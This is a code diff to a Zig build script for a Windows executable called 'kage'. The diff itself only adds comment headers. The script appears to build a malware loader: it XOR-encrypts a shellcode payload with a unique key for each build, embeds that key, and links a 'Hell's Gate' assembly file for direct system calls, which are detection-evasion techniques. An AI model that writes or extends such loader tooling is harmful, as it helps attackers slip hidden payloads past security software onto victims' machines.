@@ -1,6 +1,7 @@
 const std = @import("std");
 
 pub fn build(b: *std.Build) void {
+    //--------------------------------------------------------> BUILD CONFIG
     const target = b.standardTargetOptions(.{ .default_target = .{
         .cpu_arch = .x86_64,
         .os_tag = .windows,
@@ -8,17 +9,22 @@ pub fn build(b: *std.Build) void {
     } });
     const optimize = b.standardOptimizeOption(.{});
 
+    //--------------------------------------------------------> PER-BUILD XOR KEY
+    // seeded from @intFromPtr(b) — b is freshly heap-allocated each zig build,
+    // so every compilation gets a unique key. not cryptographic, just per-binary unique.
     var key: [16]u8 = undefined;
     var rng = std.Random.DefaultPrng.init(@intFromPtr(b));
     rng.random().bytes(&key);
     const key_u128 = std.mem.readInt(u128, &key, .little);
 
+    //--------------------------------------------------------> XOR ENCRYPTION
     // encrypt payload.bin with per-build key, write to src/payload_enc.bin.
     const buf = b.allocator.alloc(u8, 100_000_000) catch @panic("OOM");
     const payload_enc = b.build_root.handle.readFile(b.graph.io, "src/payload.bin", buf) catch @panic("payload.bin missing or too large");
     for (payload_enc, 0..) |*bte, i| bte.* ^= key[i % key.len];
     b.build_root.handle.writeFile(b.graph.io, .{ .sub_path = "src/payload_enc.bin", .data = payload_enc }) catch @panic("write failed");
 
+    //--------------------------------------------------------> MODULE + ASM LINKAGE
     const options = b.addOptions();
     options.addOption(u128, "shellcode_key", key_u128);
 
@@ -30,6 +36,7 @@ pub fn build(b: *std.Build) void {
     module.addOptions("build_options", options);
     module.addAssemblyFile(b.path("src/hells_gate.s"));
 
+    //--------------------------------------------------------> EXE + RUN STEP
     const exe = b.addExecutable(.{
         .name = "kage",
         .root_module = module,
